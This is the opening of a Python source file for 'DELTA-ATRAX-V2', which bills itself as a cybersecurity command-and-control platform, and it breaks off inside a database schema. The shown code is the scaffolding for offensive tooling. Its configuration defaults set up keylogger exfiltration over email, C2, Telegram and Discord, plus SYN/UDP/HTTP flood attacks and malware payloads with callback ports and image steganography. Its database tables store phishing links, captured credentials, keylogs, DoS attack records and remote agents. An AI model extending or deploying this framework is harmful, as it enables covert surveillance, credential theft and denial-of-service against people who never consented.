#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗ ███████╗██╗  ████████╗ █████╗     █████╗ ████████╗██████╗  █████╗ ██╗  ██╗
║   ██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗   ██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝
║   ██║  ██║█████╗  ██║     ██║   ███████║   ███████║   ██║   ██████╔╝███████║ ╚███╔╝ 
║   ██║  ██║██╔══╝  ██║     ██║   ██╔══██║   ██╔══██║   ██║   ██╔══██╗██╔══██║ ██╔██╗ 
║   ██████╔╝███████╗███████╗██║   ██║  ██║   ██║  ██║   ██║   ██║  ██║██║  ██║██╔╝ ██╗
║   ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
║                                                                              ║
║                    DELTA-ATRAX-V2 - Cyber Platform                  ║
║                         Author: Ian Carter Kulani, MSc                       ║
║                              Version: 2.0.0                                  ║
║                                                                              ║
║   COMPLETE FEATURE SET:                                                      ║
║   • 500+ Security Commands                                                   ║
║   • Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Slack,     ║
║     Signal, iMessage, Google Chat, Web Dashboard)                           ║
║   • All Ping Commands (25+ variants)                                        ║
║   • All Traceroute Commands (30+ variants)                                  ║
║   • All Nmap Commands (70+ variants)                                        ║
║   • All Curl Commands (70+ variants)                                        ║
║   • All Wget Commands (60+ variants)                                        ║
║   • All Netcat Commands (20+ variants)                                      ║
║   • 100+ Social Engineering Templates                                       ║
║   • Advanced Keylogger with Screenshot Capture                              ║
║   • Real Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)                     ║
║   • DDoS/DoS Attack Module                                                  ║
║   • SSH Remote Access                                                       ║
║   • Password Cracking Engine                                                ║
║   • Docker Security Scanning                                                ║
║   • PDF Report Generation                                                   ║
║   • SaaS Multi-Tenant Architecture                                          ║
║   • Bar & Pie Chart Visualization                                           ║
║   • Payload Generation & Deployment                                         ║
║   • Reverse Engineering Tools                                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import csv
import xml.etree.ElementTree as ET
import webbrowser
import http.server
import binascii
import marshal
import dis
import ast
import codecs
import zlib
import lzma
import bz2
import traceback
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO
from datetime import datetime, timedelta

# =====================
# VERSION & METADATA
# =====================
VERSION = "2.0.0"
NAME = "DELTA-ATRAX-V2"
AUTHOR = "Ian Carter Kulani, MSc"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform - SaaS Ready"
TOTAL_LINES = 16000

# =====================
# COLOR HANDLING
# =====================
try:
    import colorama
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.CYAN + Style.BRIGHT
        SECONDARY = Fore.MAGENTA + Style.BRIGHT
        ACCENT = Fore.YELLOW + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.BLUE + Style.BRIGHT
        DARK = Fore.BLACK + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        BG_CYAN = Back.CYAN + Fore.BLACK
        BG_MAGENTA = Back.MAGENTA + Fore.WHITE
        BG_YELLOW = Back.YELLOW + Fore.BLACK
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = DARK = WHITE = CYAN = BLUE = GREEN = MAGENTA = YELLOW = RED = RESET = BOLD = DIM = BG_CYAN = BG_MAGENTA = BG_YELLOW = ""

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.keys import Keys
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file, send_from_directory
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, sniff, RandIP
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors as pdf_colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import HexColor
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# DOCX Generation
try:
    from docx import Document
    from docx.shared import Inches, Pt
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".delta_atrax_v2"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "delta_atrax_v2.db")
LOG_FILE = os.path.join(CONFIG_DIR, "delta_atrax_v2.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "delta_atrax_reports"
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = os.path.join(CONFIG_DIR, "temp")
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
KEYLOG_SCREENSHOTS_DIR = os.path.join(CONFIG_DIR, "keylog_screenshots")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
REVERSE_ENGINEERING_DIR = os.path.join(CONFIG_DIR, "reverse_engineering")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
SAAS_DIR = os.path.join(CONFIG_DIR, "saas")
TENANTS_DIR = os.path.join(SAAS_DIR, "tenants")
BILLING_DIR = os.path.join(SAAS_DIR, "billing")
API_KEYS_DIR = os.path.join(SAAS_DIR, "api_keys")
CHARTS_DIR = os.path.join(REPORT_DIR, "charts")
MALWARE_DIR = os.path.join(CONFIG_DIR, "malware")
MALWARE_IMAGES_DIR = os.path.join(CONFIG_DIR, "malware_images")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
THREAT_MONITOR_DIR = os.path.join(CONFIG_DIR, "threat_monitor")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")

# Create all directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PDF_REPORTS_DIR, PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, KEYLOG_DIR,
    KEYLOG_SCREENSHOTS_DIR, SPEAR_PHISHING_DIR, EMAIL_TEMPLATES_DIR,
    DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR, MODULES_DIR,
    NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, REVERSE_ENGINEERING_DIR, CRACKING_DIR, DOCKER_SCANS_DIR,
    SAAS_DIR, TENANTS_DIR, BILLING_DIR, API_KEYS_DIR, CHARTS_DIR,
    MALWARE_DIR, MALWARE_IMAGES_DIR, EMAIL_COMPOSER_DIR, THREAT_MONITOR_DIR,
    MAC_LOGS_DIR, ARP_LOGS_DIR, NAT_LOGS_DIR, PLATFORM_LOGS_DIR
]

for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - DELTA-ATRAX-V2 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("DeltaAtraxV2")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class TenantTier(Enum):
    FREE = "free"
    BASIC = "basic"
    PROFESSIONAL = "professional"
    ENTERPRISE = "enterprise"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    IMAGE = "image"
    PS1 = "ps1"
    VBA = "vba"
    HTM = "htm"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class Tenant:
    id: str
    name: str
    email: str
    tier: str
    api_key: str
    created_at: str
    active: bool = True
    max_scans: int = 100
    scans_used: int = 0
    max_targets: int = 10
    targets_count: int = 0
    features: List[str] = field(default_factory=list)

@dataclass
class APIKey:
    key: str
    tenant_id: str
    name: str
    created_at: str
    expires_at: Optional[str] = None
    active: bool = True
    permissions: List[str] = field(default_factory=list)
    rate_limit: int = 1000
    requests_used: int = 0

@dataclass
class MalwarePayload:
    id: str
    name: str
    payload_type: str
    file_path: str
    image_path: Optional[str]
    created_at: str
    callback_host: str
    callback_port: int

@dataclass
class EmailMessage:
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": False,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600,
            "download_url": ""
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "hashcat",
            "wordlist_path": os.path.join(CONFIG_DIR, "wordlists", "rockyou.txt"),
            "default_hash_type": 0,
            "max_threads": 4
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        },
        "saas": {
            "enabled": True,
            "multi_tenant": True,
            "billing_enabled": True,
            "api_rate_limit": 1000,
            "trial_days": 14,
            "free_tier_scans": 10,
            "basic_tier_scans": 100,
            "pro_tier_scans": 1000,
            "enterprise_tier_scans": 10000
        },
        "malware": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "image_steganography": True,
            "auto_deploy": False
        },
        "charts": {
            "enabled": True,
            "bar_charts": True,
            "pie_charts": True,
            "line_charts": True,
            "default_theme": "dark"
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            # Command History
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            # Threats
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            # Managed IPs
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            # SSH Connections
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            # SSH Commands
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            # Traffic Logs
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Nikto Scans
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Phishing Links
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            # Captured Credentials
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            # Scans
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Users
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Sessions
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            # Keylogs
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            # Spear Phishing Campaigns
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            # Email Tracking
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            # DOS Attacks
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Agents
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            # Agent Commands
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
